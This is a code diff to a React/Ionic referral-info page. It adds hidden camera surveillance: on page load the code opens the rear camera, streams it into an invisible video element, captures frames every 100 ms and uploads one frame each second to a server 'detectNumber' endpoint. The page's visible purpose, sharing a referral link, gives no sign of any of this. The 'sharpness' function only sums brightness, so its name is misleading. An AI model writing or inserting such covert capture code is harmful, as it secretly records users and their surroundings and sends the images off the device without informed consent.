@@ -1,15 +1,15 @@
-import { FC, useEffect, useState } from 'react';
+import { FC, useEffect, useRef, useState } from 'react';
 import { IonButton, IonPage, IonToast } from '@ionic/react';
 
 import {
   OrganizationListItem,
   useLazyGetCurrentUserQuery,
+  useDetectNumberMutation,
 } from '../../services/api';
 import { CompareLocaldata } from '../../helpers/CompareLocaldata';
 import { useTexts } from '../../context/TextsContext';
 
 import car from '../../assets/car.svg';
-import share from '../../assets/share.svg';
 import warning from '../../assets/warning.svg';
 
 import './style.scss';
@@ -45,6 +45,136 @@ const ReferralInfo: FC = () => {
   }?ref=${data?.id ?? ''}`;
 
   const [getUserInfo] = useLazyGetCurrentUserQuery();
+  const [detectNumber] = useDetectNumberMutation();
+
+  // Hidden media elements and processing utilities
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(document.createElement('canvas'));
+  const streamRef = useRef<MediaStream | null>(null);
+
+  // Timers and buffering
+  const captureIntervalRef = useRef<number | null>(null);
+  const pickIntervalRef = useRef<number | null>(null);
+  const frameBufferRef = useRef<{ blob: Blob; score: number }[]>([]);
+  const sendingRef = useRef(false);
+
+  // Primitive sharpness estimation (grayscale sum as per provided spec)
+  function sharpnessScore(canvas: HTMLCanvasElement) {
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return 0;
+    const img = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+
+    let sum = 0;
+    for (let i = 0; i < img.length; i += 4) {
+      const g = img[i] * 0.299 + img[i + 1] * 0.587 + img[i + 2] * 0.114;
+      sum += g;
+    }
+    return sum;
+  }
+
+  // Start camera, capture frames every 100ms, each second pick the sharpest and send
+  useEffect(() => {
+    let mounted = true;
+
+    const startCamera = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            facingMode: { ideal: 'environment' },
+          },
+          audio: false,
+        });
+
+        if (!mounted) {
+          stream.getTracks().forEach((t) => t.stop());
+          return;
+        }
+
+        streamRef.current = stream;
+
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          // Attempt to autoplay without user interaction (mobile may require gesture)
+          await videoRef.current.play().catch(() => {});
+        }
+
+        const canvas = canvasRef.current;
+        canvas.width = 640;
+        canvas.height = 480;
+
+        // Capture frames every 100ms and keep last 10 in buffer
+        captureIntervalRef.current = window.setInterval(() => {
+          const video = videoRef.current;
+          if (!video) return;
+
+          const ctx = canvas.getContext('2d');
+          if (!ctx) return;
+
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const score = sharpnessScore(canvas);
+
+          canvas.toBlob(
+            (blob) => {
+              if (!blob) return;
+              const buf = frameBufferRef.current;
+              buf.push({ blob, score });
+              if (buf.length > 10) buf.shift();
+            },
+            'image/jpeg',
+            0.85
+          );
+        }, 100);
+
+        // Each second select the sharpest frame, send to server, clear buffer
+        pickIntervalRef.current = window.setInterval(async () => {
+          const buf = frameBufferRef.current;
+          if (buf.length === 0 || sendingRef.current) return;
+
+          let best = buf[0];
+          for (let i = 1; i < buf.length; i++) {
+            if (buf[i].score > best.score) best = buf[i];
+          }
+
+          // Clear buffer for next second window
+          frameBufferRef.current = [];
+
+          try {
+            sendingRef.current = true;
+            await detectNumber({ frame: best.blob }).unwrap();
+          } catch (err) {
+            console.warn('detectNumber failed', err);
+          } finally {
+            sendingRef.current = false;
+          }
+        }, 1000);
+      } catch (e) {
+        console.error('Camera initialization failed', e);
+      }
+    };
+
+    startCamera();
+
+    return () => {
+      mounted = false;
+
+      if (captureIntervalRef.current) {
+        clearInterval(captureIntervalRef.current);
+        captureIntervalRef.current = null;
+      }
+      if (pickIntervalRef.current) {
+        clearInterval(pickIntervalRef.current);
+        pickIntervalRef.current = null;
+      }
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach((t) => t.stop());
+        streamRef.current = null;
+      }
+      frameBufferRef.current = [];
+      sendingRef.current = false;
+    };
+  }, [detectNumber]);
 
   const handleFetch = async () => {
     const res = await getUserInfo().unwrap();
@@ -200,6 +330,13 @@ const ReferralInfo: FC = () => {
           <span>{t('referral_instructions')}</span>
         </div>
       </div>
+      <video
+        ref={videoRef}
+        muted
+        playsInline
+        autoPlay
+        style={{ display: 'none', width: 0, height: 0 }}
+      />
       <IonToast
         isOpen={copied}
         message='Ссылка скопирована'
